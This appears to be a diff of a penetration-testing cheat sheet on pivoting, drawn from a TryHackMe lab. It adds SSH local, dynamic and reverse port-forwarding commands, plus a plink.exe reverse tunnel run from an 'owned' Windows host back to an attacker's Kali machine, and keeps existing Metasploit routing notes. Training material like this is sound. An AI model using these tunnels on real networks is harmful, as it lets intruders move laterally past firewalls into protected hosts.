@@ -2,6 +2,10 @@
 
 Through pivoting it is possible to scan/enumerate/exploit targets in a new subnet or behind a firewall/DMZ from a bastion host (host acts as some kind of proxy).
 
+Types
+- `Tunneling`  and/or `Proxying`:  Pipe all the traffic over intermediary hosts, more versatile but less stable/hidden
+- `Port Forwarding`: Forward one specific port over an intermediary host to get deeper into the network stable and hidden, but usually only a specific port
+
 ## Enable pivoting through an established meterpreter session
 
 ### 0. Prerequisites
@@ -96,7 +100,24 @@ Proto Recv-Q Send-Q Local Address           Foreign Address         State       
 tcp        0      0 0.0.0.0:3333            0.0.0.0:*               LISTEN      54056/ruby          
 ```
 
-### REVERSE portforwarding
+## Forward connections (with SSH)
+> Taken from the `wreath-network` on tryhackme with LotL-tools
+
+Port Forwarding
+
+```bash
+ssh -L <localPort>:<IP-hostB>:<Port-hostB> userA@<IP-HostA> -fN # -fn background the shell
+ssh -L 3333:10.10.10.5:3389 user@10.10.10.15 -fN # according to below image
+```
+
+Proxying
+
+```bash
+ssh -D <localPort> userB@<hostB> -fN # pipe all traffic via a given port over hostB
+ssh -D 9050 user@10.10.10.15 -fN # according to below image
+```
+
+## REVERSE portforwarding
 
 > So the target machine has a route back over the exploited machine
 
@@ -119,6 +140,35 @@ msf> set session 1 # meterpreter session playing the proxy
 ```
 
 Traffice is piped over the exploited machine from the target machine to the attacker!
+
+## Reverse connections (with SSH)
+> Again taken from the `wreath-network` on tryhackme
+
+Connect from the remote machine onto your attacker machine.
+
+```bash
+# create a key on the remote system
+ssh-keygen
+
+# write the key into your attacker machine authorized_keys like this
+command="echo 'This account can only be used for port forwarding'",no-agent-forwarding,no-x11-forwarding,no-pty ssh-rsa AAA....zxae= kali@kali
+
+# check your local ssh is up and running
+sudo systemctl status ssh
+```
+
+Push your newly created *temporary* private key onto the remote machine and establish a reverse portforwarding:
+
+```bash
+ssh -R <localport>:<targetIP>:<targetPort> username@kali -i <keyfile> -fN
+ssh -R 8000:10.10.10.5:3389 kali@kali -i tempkey -fN # executed on 10.10.10.15 - according to above image!
+```
+
+Reverse proxy on new ssh clients
+
+```bash
+ssh -R 1337 kali@kali -i tempkey -fN # pipe all traffice on 1337 on kali into the remote network
+```
 
 ### Followup
 
@@ -148,3 +198,29 @@ socks5  127.0.0.1 1081 # Pivot 2
 Why should it work?
 -> If we utilize Metasploit and add the correct routing table entries for the deep network the metasploit internal socks_proxy will pipe the traffic through the intermediate exploited hosts:
 *This module provides a SOCKS proxy server that uses the builtin Metasploit routing to relay connections.*
+
+
+## Other specifics on windows
+> In case ssh is not running
+
+Push the `plink.exe` from [putty](https://www.putty.org/) onto the owned machine, in order to create a ***REVERSE CONNECTION*** do as follows on the intermediate host:
+
+```bash
+cmd.exe /c echo y | .\plink.exe -R <kaliPort>:<targetIP>:<targetPort> kali@kali -i <keyfile> -N
+
+# for the image above:
+cmd.exe /c echo y | .\plink.exe -R 8000:10.10.10.5:3389 kali@kaliIP -i keyfile -N
+```
+
+`10.10.10.5` is the host *deep* in the network...
+
+### create ssh keys working on windows
+> on linux generated keys may not properly work on windows, therefore we avert this behaviour and do it windows style.
+
+It's a conversion - so we still need the `ssh-keygen` generated keys!
+
+```bash
+ssh-keygen
+sudo apt install putty-tools
+puttygen id_rsa -o windowskey.ppk
+```
